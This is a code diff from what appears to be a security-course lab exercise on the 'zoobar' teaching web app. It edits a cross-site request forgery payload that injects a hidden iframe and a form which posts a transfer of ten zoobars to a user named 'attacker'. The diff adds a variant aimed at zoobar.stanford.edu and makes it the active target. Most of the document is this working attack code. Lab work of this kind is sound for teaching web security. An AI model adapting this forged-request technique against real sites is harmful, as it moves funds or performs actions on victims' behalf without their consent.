@@ -48,8 +48,15 @@
 			 * Note: need id and name to match for iframe, otherwise Firefox will not post form to target iframe
 			 * see: http://stackoverflow.com/questions/7083325/firefox-form-targetting-an-iframe-is-opening-new-tab
 			 */
-			var egg = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
+			var egg_localhost = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
 				"<form id='transferForm' action='http://localhost/transfer.php' method='POST' target='innerFrame'>" +
+				"<input type='text' name='zoobars' value='10'>" +
+				"<input type='text' name='recipient' value='attacker'>" +
+				"<input type='text' name='submission' value='Send'>" +
+				"</form>";
+
+			var egg_stanford = "<iframe id='innerFrame' name='innerFrame'></iframe>" +
+				"<form id='transferForm' action='http://zoobar.stanford.edu/transfer.php' method='POST' target='innerFrame'>" +
 				"<input type='text' name='zoobars' value='10'>" +
 				"<input type='text' name='recipient' value='attacker'>" +
 				"<input type='text' name='submission' value='Send'>" +
@@ -69,7 +76,8 @@
 			outerFrameDoc.close();
 			
 			/* Create the inner frame and form within the outer frame. */
-			outerFrameDoc.body.innerHTML = egg;
+			// outerFrameDoc.body.innerHTML = egg_localhost;
+			outerFrameDoc.body.innerHTML = egg_stanford;
 			
 			/* Submit the transform form */
 			var transferForm = outerFrameDoc.body.children['transferForm'];
